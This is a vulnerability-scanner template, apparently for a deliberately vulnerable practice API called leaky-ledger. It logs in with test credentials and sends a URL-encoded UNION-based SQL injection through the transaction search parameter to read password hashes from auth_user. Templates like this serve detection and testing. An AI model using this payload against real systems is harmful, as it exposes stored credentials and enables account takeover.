id: leaky-ledger-sqli-transaction-search

info:
  name: leaky-ledger - SQL injection in transaction search
  author: leaky-ledger
  severity: critical
  description: UNION-based injection through ?q= that returns password hashes from auth_user.
  classification:
    cwe-id: CWE-89
  tags: sqli,api,leaky-ledger

http:
  - raw:
      - |
        POST /api/auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"bob","password":"bob-pass-1"}
      - |
        GET /api/transactions/search?q=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%20FROM%20auth_user--%20 HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{token}}

    extractors:
      - type: json
        name: token
        part: body_1
        internal: true
        json:
          - ".token"

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "pbkdf2_sha256")'
        condition: and
